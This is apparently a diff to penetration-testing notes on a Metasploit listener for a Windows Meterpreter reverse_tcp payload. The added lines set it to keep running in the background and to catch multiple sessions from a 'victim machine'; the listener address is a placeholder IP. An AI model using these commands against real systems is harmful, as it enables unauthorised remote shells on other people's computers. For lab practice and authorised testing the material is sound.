@@ -62,6 +62,7 @@ http://192.0.0.0:8000/
 >> set LHOST 192.0.0.0
 >> set LPORT 4444
 >> options
+>> set ExitOnSession False
 
 # check when everything is septup
 msf6 payload(windows/meterpreter/reverse_tcp) > options
@@ -76,8 +77,11 @@ Module options (payload/windows/meterpreter/reverse_tcp):
 
 
 ------------------------------------------------------------------------------------------------------------
-# start exploiting the vitctim machine
+# start exploiting the victim machine in background
 
+msf6 payload(windows/meterpreter/reverse_tcp) > exploit -j
+
+# start exploiting the victim machine in background
 msf6 payload(windows/meterpreter/reverse_tcp) > exploit
 [*] Payload Handler Started as Job 0
 
